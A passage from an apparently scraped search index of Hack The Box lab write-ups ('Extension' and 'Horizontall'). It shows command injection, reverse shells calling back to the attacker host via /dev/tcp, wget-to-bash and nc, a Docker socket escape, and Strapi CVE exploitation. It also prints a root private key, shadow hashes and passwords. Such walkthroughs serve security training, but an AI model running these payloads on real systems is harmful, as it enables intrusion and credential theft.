snip ...]\" | base64 -d &gt; backups.tar.gz\n➜  extension tar -xvf backups.tar.gz\nhome/charlie/\nhome/charlie/backups/\nhome/charlie/backups/backup.tar.gz\nhome/charlie/.profile\nhome/charlie/.bash_history\nhome/charlie/.bash_logout\nhome/charlie/.ssh/\nhome/charlie/.ssh/id_rsa\nhome/charlie/.ssh/id_rsa.pub\nhome/charlie/.bashrc\n\n➜  .ssh ssh charlie@extension.htb -i id_rsa \ncharlie@extension:~$ id && hostname\nuid=1001(charlie) gid=1001(charlie) groups=1001(charlie)\nextension\n\ncharlie@extension:~$ cat .git-credentials \nhttp://charlie:MqiereNBGq4DqSVYaC8nazMXzuYqFJ9WPnIZSIWz@dev.snippet.htb\n\n\nStep 5\nUser charlie doesn’t have access to user.txt, we still need to pivot to jean. We noticed earlier that Jean used the same password for Git and Mail, trying to change user with su jean proves that she yet again use the same password.\ncharlie@extension:~$ su jean\nPassword: EHmfar1Y7ppA9O5TAIXnYnJpA\n\njean@extension:~$ id\nuid=1000(jean) gid=1000(jean) groups=1000(jean)\n\njean@extension:~$ cat user.txt\n5f1b4312834b32b832925f86933a700b\n\n\n\n\nROOT\n\nStep 1\nChecking the usual directories and commands for anomalies - /, /opt, /tmp, /var/www, sudo -l, ps aux, netstat -tulpn\nWe find /snap, it’s not very common for HTB boxes but this might be an exception as it’s a Ubuntu host we’re on.\nInteresting directories in /opt:\njean@extension:/opt$ ls -al\ntotal 16\ndrwxr-xr-x  4 root root 4096 Jan  3  2022 .\ndrwxr-xr-x 24 root root 4096 Jun 24 14:57 ..\ndrwx--x--x  4 root root 4096 Jan  2  2022 containerd\ndrwxr-xr-x  4 root root 4096 Jan  3  2022 WebDriver\nMozilla profile in /tmp:\njean@extension:/tmp$ ls -al\n[... snip ...]\ndrwxr-xr-x 13 root root 4096 Sep 10 11:05 rust_mozprofileI7joD3\nHowever it only contains 3 of the 4 files needed (missing logins.json) and we cant’t read cert9.db nor key4.db:\njean@extension:/tmp/rust_mozprofileI7joD3$ ls -al\ntotal 16312\n-rw-------  1 root root  229376 Sep 10 07:48 cert9.db\n-rw-r--r--  1 root root  524288 Sep 10 11:05 cookies.sqlite\n-rw-------  1 root root  294912 Sep 10 07:48 key4.db\nA lot of new internal port:\njean@extension:/var/www$ netstat -tulpn\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                               \ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:43743         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:41411         0.0.0.0:*               LISTEN      -    \nLooking in the nginx config we can identify port 3000, 8000 and 8001:\njean@extension:/etc/nginx$ cat sites-available/default\n[... snip ...]\nserver_name _;\n    proxy_pass http://127.0.0.1:8001;\n[... snip ...]\nserver_name mail.snippet.htb;\n    proxy_pass http://127.0.0.1:8000;\n[... snip ...]\nserver_name dev.snippet.htb;\n    proxy_pass http://127.0.0.1:3000;\nCopy over pspy64 and see if there’s anything executing behind the scenes:\ncharlie@extension:/dev/shm$ wget http://10.10.14.10/pspy64\ncharlie@extension:/dev/shm$ chmod +x pspy64\ncharlie@extension:/dev/shm$ ./pspy64\n[... snip ...]\n2022/09/11 13:15:01 CMD: UID=0    PID=8058   | sh -c mysql -u root -ptoor --database webapp --execute \"delete from snippets where id &gt; 2;\"\n2022/09/11 13:15:01 CMD: UID=0    PID=8065   | docker exec 2ee49381d443 sh -c mysql -u root -ptoor --database webapp --execute \"UPDATE users set password='30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82' where email='charlie@snippet.htb';\"\n2022/09/11 13:15:01 CMD: UID=0    PID=8115   | sh -c mysql -u root -ptoor --database webapp --execute \"UPDATE users set password='7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6' where email='jean@snippet.htb';\" \nWe find credentials and database name for mysql - root:toor. Setup SSH tunnels and change one of the previous found accounts user_type from Member to Manager:\n➜  .ssh ssh -N -f -L 3306:localhost:3306 charlie@extension.htb -i id_rsa\n➜  extension mysql -h 127.0.0.1 -D webapp -u root -p\n\nMySQL [webapp]&gt; select * from users where email = 'juliana@snippet.htb';\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n| id  | name          | email               | email_verified_at   | password                                                         | remember_token                                               | created_at          | updated_at          | user_type |\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n| 701 | Juliana Thiel | juliana@snippet.htb | 2022-01-02 20:15:32 | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF | 2022-01-02 20:15:37 | 2022-06-20 11:46:35 | Member    |\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n\nMySQL [webapp]&gt; update users set user_type = 'Manager' where users.id = 701;\nQuery OK, 1 row affected (0.034 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nMySQL [webapp]&gt; select * from users where email = 'juliana@snippet.htb';\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n| id  | name          | email               | email_verified_at   | password                                                         | remember_token                                               | created_at          | updated_at          | user_type |\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n| 701 | Juliana Thiel | juliana@snippet.htb | 2022-01-02 20:15:32 | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF | 2022-01-02 20:15:37 | 2022-06-20 11:46:35 | Manager   |\n+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+\n\n\nStep 2\nLogging in as juliana@snippet.htb it doesn’t seem like anything special happened. The only new feature we have is to “Show all” snippets, that including private ones:\n\nAnd this “Validate” button for all the users:\n\nPressing Validate will send a post request to validate the email of the user, and we’ll get the response “Mail is valid!”.\nPlaying around in MySQL I tried to change email of Kaleigh Lehner and noticed that entering ;, & or | still registered as valid email. Instead of guessing I decide to look in to the source code to see how this function works and find this:\njean@extension:~/projects/laravel-app/app/Http/Controllers$ cat AdminController.php\n[... snip ...]\n} else {\n    $res = shell_exec(\"ping -c1 -W1 $domain &gt; /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'\");\n    return Redirect::back()-&gt;with('message', trim($res));\n}\nThe input data isn’t sanitized since we can write directly into the MySQL database and from the vulnerable shell_exec function get command injection.\nMySQL [webapp]&gt; update users set email = \"&id&\" where users.id = 895;\nQuery OK, 1 row affected (0.035 sec)\nRows matched: 1  Changed: 1  Warnings: 0\nPress “VALIDATE” to execute command:\n\nSetup a reverse shell payload to get foothold on the docker container:\n➜  extension echo \"bash -i &gt;& /dev/tcp/10.10.14.10/4488 0&gt;&1\" &gt; rev.sh\n➜  extension chmod +x rev.sh \n➜  extension python3 -m http.server 80\n\nMySQL [webapp]&gt; update users set email = \"&wget -qO- http://10.10.14.10/rev.sh | bash&\" where users.id = 895;\nQuery OK, 1 row affected (0.033 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\n## PRESS 'VALIDATE'\n\n10.10.11.171 - - [11/Sep/2022 18:31:18] \"GET /rev.sh HTTP/1.1\" 200 -\n\n➜  extension nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.171] 53454\nbash: cannot set terminal process group (46): Inappropriate ioctl for device\nbash: no job control in this shell\napplication@4dae106254bf:/var/www/html/public$ id\nuid=1000(application) gid=1000(application) groups=1000(application),999(app)\n\n\nStep 3\nUpload deepce.sh and enumerate the container.\napplication@4dae106254bf:/dev/shm$ wget http://10.10.14.10/deepce.sh\napplication@4dae106254bf:/dev/shm$ chmod +x deepce.sh\napplication@4dae106254bf:/dev/shm$ bash deepce.sh\n[... snip ...]\n[+] Dangerous Capabilities .. Yes\ncap_dac_override\n\n[... snip ...]\n====================================( Enumerating Mounts )====================================\n[+] Docker sock mounted ....... Yes\nThe docker sock is writable, we should be able to enumerate docker, create containers \nand obtain root privs on the host machine\nSee https://stealthcopter.github.io/deepce/guides/docker-sock.md\nLets try to escape through the mounted docker socket.\napplication@4dae106254bf:/dev/shm$ find / -name docker.sock 2&gt;/dev/null    \n/app/docker.sock\nGoogle for “exploit docker sock” and the first hit is a nice bash script to escape. Follow the script step-by-step.\n\nFind available images:\n\napplication@4dae106254bf:/dev/shm$ curl -s --unix-socket /app/docker.sock http://localhost/images/json\n[{\"Containers\":-1,\"Created\":1656086146,\"Id\":\"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227\",\"Labels\":{\"io.webdevops.layout\":\"8\",\"io.webdevops.version\":\"1.5.0\",\"maintainer\":\"info@webdevops.io\",\"vendor\":\"WebDevOps.io\"},\"ParentId\":\"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af\",\"RepoDigests\":null,\"RepoTags\":[\"laravel-app_main:latest\"],\"SharedSize\":-1,\"Size\":1975239137,\"VirtualSize\":1975239137},{\"Containers\":-1,\"Created\":1655515586,\"Id\":\"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e\",\"Labels\":{\"io.webdevops.layout\":\"8\",\"io.webdevops.version\":\"1.5.0\",\"maintainer\":\"info@webdevops.io\",\"vendor\":\"WebDevOps.io\"},\"ParentId\":\"\",\"RepoDigests\":null,\"RepoTags\":[\"webdevops/php-apache:7.4\"],\"SharedSize\":-1,\"Size\":1028279761,\"VirtualSize\":1028279761},{\"Containers\":-1,\"Created\":1640902141,\"Id\":\"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce\",\"Labels\":{\"maintainer\":\"Thomas Bruederli &lt;thomas@roundcube.net&gt;\"},\"ParentId\":\"\",\"RepoDigests\":[\"roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194\"],\"RepoTags\":[\"roundcube/roundcubemail:latest\"],\"SharedSize\":-1,\"Size\":612284073,\"VirtualSize\":612284073},{\"Containers\":-1,\"Created\":1640805761,\"Id\":\"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705\",\"Labels\":null,\"ParentId\":\"\",\"RepoDigests\":[\"composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656\"],\"RepoTags\":[\"composer:latest\"],\"SharedSize\":-1,\"Size\":193476514,\"VirtualSize\":193476514},{\"Containers\":-1,\"Created\":1640297121,\"Id\":\"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d\",\"Labels\":{\"org.opencontainers.image.authors\":\"The Docker Mailserver Organization on GitHub\",\"org.opencontainers.image.description\":\"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database.\",\"org.opencontainers.image.documentation\":\"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md\",\"org.opencontainers.image.licenses\":\"MIT\",\"org.opencontainers.image.revision\":\"061bae6cbfb21c91e4d2c4638d5900ec6bee2802\",\"org.opencontainers.image.source\":\"https://github.com/docker-mailserver/docker-mailserver\",\"org.opencontainers.image.title\":\"docker-mailserver\",\"org.opencontainers.image.url\":\"https://github.com/docker-mailserver\",\"org.opencontainers.image.vendor\":\"The Docker Mailserver Organization\",\"org.opencontainers.image.version\":\"refs/tags/v10.4.0\"},\"ParentId\":\"\",\"RepoDigests\":[\"mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35\"],\"RepoTags\":[\"mailserver/docker-mailserver:latest\"],\"SharedSize\":-1,\"Size\":560264926,\"VirtualSize\":560264926},{\"Containers\":-1,\"Created\":1640059378,\"Id\":\"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060\",\"Labels\":{\"maintainer\":\"maintainers@gitea.io\",\"org.opencontainers.image.created\":\"2021-12-21T03:59:32Z\",\"org.opencontainers.image.revision\":\"877040e6521e48c363cfe461746235dce4ab822b\",\"org.opencontainers.image.source\":\"https://github.com/go-gitea/gitea.git\",\"org.opencontainers.image.url\":\"https://github.com/go-gitea/gitea\"},\"ParentId\":\"\",\"RepoDigests\":[\"gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c\"],\"RepoTags\":[\"gitea/gitea:1.15.8\"],\"SharedSize\":-1,\"Size\":148275092,\"VirtualSize\":148275092},{\"Containers\":-1,\"Created\":1640055479,\"Id\":\"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5\",\"Labels\":null,\"ParentId\":\"\",\"RepoDigests\":[\"mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\"],\"RepoTags\":[\"mysql:5.6\"],\"SharedSize\":-1,\"Size\":302527523,\"VirtualSize\":302527523},{\"Containers\":-1,\"Created\":1639694686,\"Id\":\"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7\",\"Labels\":null,\"ParentId\":\"\",\"RepoDigests\":[\"php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b\"],\"RepoTags\":[\"php:7.4-fpm-alpine\"],\"SharedSize\":-1,\"Size\":82510913,\"VirtualSize\":82510913}\nAt the top we find laravel-app_main:latest - lets use that one.\n\nDeclare the cmd variable, change IP address and port to fit our needs. This command will be triggered when we start the container.\n\napplication@4dae106254bf:/dev/shm$ cmd=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &&gt;/dev/tcp/10.10.14.10/4499 0&lt;&1'\\\\\\\"\\\"]\"\n\nCreate the container and execute command, bind the root filesystem to it, name the container exploit.se_root and execute as detached (-d)\n\napplication@4dae106254bf:/dev/shm$ curl -s -X POST --unix-socket /app/docker.sock -d \"{\\\"Image\\\":\\\"laravel-app_main\\\",\\\"cmd\\\":$cmd,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name=exploit.se_root\n\nStart the container - and trigger the reverse shell\n\napplication@4dae106254bf:/dev/shm$ curl -s -X POST --unix-socket /app/docker.sock \"http://localhost/containers/exploit.se_root/start\"\n➜  extension nc -lvnp 4499\nlistening on [any] 4499 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.171] 57132\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@cbe7b6cef335:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@cbe7b6cef335:/# cat /root/root.txt\n9bf63e789d19a7507442df8e42d41225\n\nroot@cbe7b6cef335:/# cat /root/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT\n7kZWP3uElhlwF2WbqsPoS/iUtAjV9keflS/38zfZEp1n/o7g+q8Fw+oxF0s/6fud\nhA4KieW/bKnG+aeaC/lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6Egy\nywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72Ei\nPyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO/EsQYD\nqEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6Vq\nNHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU/L2oOTUgv3ytIFBlGpZen75rr3AQ\nztvEPa8MlDB/W6p+8EeY0b7TwvJAd6f1/V32vKcwKINkqSfOFtNQCYOOzpbjlMTk\np/Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw\n6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVE\npTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6/++vJPsm+V1/xaModV+XRyg\nTjsQ0MJBAoGBAOnZ7qtDS/3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTf\nfW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCB\nXEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS\n7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyix\nocFijM0Jc+BX0c13bhCgnjxnZ2/IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41\nxSL6kSRI+Po/6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L\n0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ/AnHgmMDkGiSUJ1l4hhHlLjlk\nEYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9Wbu\ncRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3/C\nmP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8W\nu+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkU\neBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW\n9Pp/C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GV\nQGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==\n-----END RSA PRIVATE KEY-----\n\nroot@cbe7b6cef335:/# cat /etc/shadow\nroot:$6$XJ0deONw$c1ag/76NHYRVSxMwMeoYPUDsxZDdjC6sX5KKa.QUHi2mjIwN1NlLyRt3QS3E6JjPknuSSOyIUcTTq2SbIXZle/:19157:0:99999:7:::\njean:$6$2ct8z568$.FX4a9sSYGk0QxQiqfiMFIRu.oGdRvGcFgtOz3Hu9bV2i6/Z.IpWlZxZn5iySUJuq9Rqw6oS8yTSFxbAZ4ede.:19156:0:99999:7:::\ncharlie:$6$Ai.uOoSz$8QB.fXSM7pS2DDpUNBR3Xr3v3MUqlWdSmwEtOjOaRpH73UxGrcxJ/hPkM7h.MfFHM2gzoyHL0.c7s/glcc0Fu.:18995:0:99999:7:::"
  },
  {
    "objectID": "posts/2021-08-31-htb-writeup-horizontall/2021-08-31-htb-writeup-horizontall.html",
    "href": "posts/2021-08-31-htb-writeup-horizontall/2021-08-31-htb-writeup-horizontall.html",
    "title": "Horizontall - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/horizontall]# nmap -Pn -n -sCV 10.129.206.206 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: ==&gt; DIRECTORY: http://horizontall.htb/css/ + http://horizontall.htb/favicon.ico (CODE:200|SIZE:4286) ==&gt; DIRECTORY: http://horizontall.htb/img/ + http://horizontall.htb/index.html (CODE:200|SIZE:901) ==&gt; DIRECTORY: http://horizontall.htb/js/\nNIKTO: + Server: nginx/1.14.0 (Ubuntu)\n\nHttp-server redirect to horizontall.htb, add to /etc/hosts. Enumerating the website for hours and got nothing. After A LOT of time i beutified the JS Source ‘app.c68eb462.js’ and within found a vhost: &gt; r.a.get(“http://api-prod.horizontall.htb/reviews”).then((function(s) {\n\nAdd api-prod.horizontall.htb to /etc/hosts.\n[root:/git/htb/horizontall]# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://api-prod.horizontall.htb/FUZZ Admin [Status: 200, Size: 854, Words: 98, Lines: 17] ADMIN [Status: 200, Size: 854, Words: 98, Lines: 17] admin [Status: 200, Size: 854, Words: 98, Lines: 17] favicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 1] reviews [Status: 200, Size: 507, Words: 21, Lines: 1] robots.txt [Status: 200, Size: 121, Words: 19, Lines: 4] users [Status: 403, Size: 60, Words: 1, Lines: 1]\n/admin is a strapi login prompt /reviews we find three users - wail, doe, john /robots.txt has nothing of use\n\nBy browsing asdasd and capturing it to burp, or using cURL we find strapi is running on version 3.0.0-beta.17.4.\n\nBurp: GET /admin/init HTTP/1.1 Host: api-prod.horizontall.htb\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) .. {“data”:{“uuid”:“a55da3bd-9693-4a08-9279-f9df57fd1817”,“currentEnvironment”:“development”,“autoReload”:false,“strapiVersion”:“3.0.0-beta.17.4”}}\ncURL: [root:/git/htb/horizontall]# curl http://api-prod.horizontall.htb/admin/strapiVersion (master✱) {“strapiVersion”:“3.0.0-beta.17.4”}\nA quick google about strapi version 3.0.0-beta.17.4 and we find CVE-2019-18818 which allows for unauthenticated change of password. Very convenient as we have three found users - wail, doe, john. Download the script and fire\n[root:/git/htb/horizontall]# python cve-2019-18818.py wail http://api-prod.horizontall.htb test123 (master✱) [*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4 [*] Sending password reset request… [*] Setting new password… [*] Response: {“jwt”:“eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzMyNTY1LCJleHAiOjE2MzI5MjQ1NjV9.xjUBGvFvWqkQY2T79R3ihmocqhH02xYmQh7uCV10sis”,“user”:{“id”:3,“username”:“admin”,“email”:“admin@horizontall.htb”,“blocked”:null}}\nWe should now be able to login to the dashboard with creds admin@horizontall.htb:test123\n\nFurther googling about strapi 3.0.0-beta.17.4 exploits I find CVE-2019-19609: &gt; “The Strapi framework before 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin &gt; components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell &gt; commands to be executed by the execa function.”\n\nTrying to find a poc I find this a blogpost explaining the issue with this strapi version: &gt; I noticed a bit of potentially dangerous code in the plugin installPlugin and uninstallPlugin handler functions for the admin panel (packages/strapi-admin/controllers/Admin.js): &gt; Both functions pass unsanitized user input ctx.params.plugin to execa() which is executed on the system. &gt; We can use command substitution to inject commands and execute arbitrary code alongside the node call: &gt; {“plugin”: “documentation && $(whoami &gt; /tmp/whoami)”,“port”:“1337”} &gt; This payload should create a /tmp/whoami file on the target system.\nAt the end of the blogpost they have a beautiful cURL string that will give us a reverse shell, if we have the JWT. From our previous exploit (CVE-2019-18818) we got a JWT, so paste it and exploit!\n[root:/git/htb/horizontall]# curl -i -s -k -X $‘POST’ -H $‘Host: api-prod.horizontall.htb’ -H $‘Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzMyNTY1LCJleHAiOjE2MzI5MjQ1NjV9.xjUBGvFvWqkQY2T79R3ihmocqhH02xYmQh7uCV10sis’ -H $‘Content-Type: application/json’ -H $‘Origin: http://api-prod.horizontall.htb’ -H $‘Content-Length: 123’ -H $‘Connection: close’ –data $‘{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.15.74 4488 &gt;/tmp/f)\",\"port\":\"80\"}’ $‘http://api-prod.horizontall.htb/admin/plugins/install’\n[root:/git/htb/horizontall]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.15.74] from (UNKNOWN) [10.129.207.83] 48656 /bin/sh: 0: can’t access tty; job control turned off $ id && hostname uid=1001(strapi) gid=1001(strapi) groups=1001(strapi) horizontall $ pwd /opt/strapi/myapi $ ls -al /home total 12 drwxr-xr-x 3 root root 4096 May 25 11:43 . drwxr-xr-x 24 root root 4096 Aug 23 11:29 .. drwxr-xr-x 8 developer developer 4096 Aug 2 12:07 developer $ cat /home/developer/user.txt 06469191e69943c1c278099219ba813f\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nSudo -l isn’t possible since we don’t know the password.\n\nUsing linpeas we see that there are some locally running services. Port 3306 is of course MYSQL used for strapi, which is running locally on port 1337. However port 8000 is unknown.\nstrapi@horizontall:/dev/shm$ ./linpeas.sh .. [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1831/node /usr/bin/ tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN -\nTrying to setup a SSH Tunnel from the inside out fails, we don’t seem the have permission to SSH outside the box itself. Lets create and add our public key to authorized_keys and tunnel from outside in.\n[root:/git/htb/horizontall]# ssh-keygen -t rsa (master✱) Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/horizontall/id_rsa-strapi Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /git/htb/horizontall/id_rsa-strapi Your public key has been saved in /git/htb/horizontall/id_rsa-strapi.pub The key fingerprint is: SHA256:M354QA3Aiapd3GSLk5i6lKTYxVMatQQ3u4UY0UZBdjQ root@nidus The key’s randomart image is: +—[RSA 3072]—-+ | +X@=E | | oO + | | *.@+.o . | | .+ @ o+ | |+=.o o. S | |=oo . = | |.. o o | |. o | | | +—-[SHA256]—–+\nstrapi@horizontall:~/.ssh$ echo “ssh-rsa 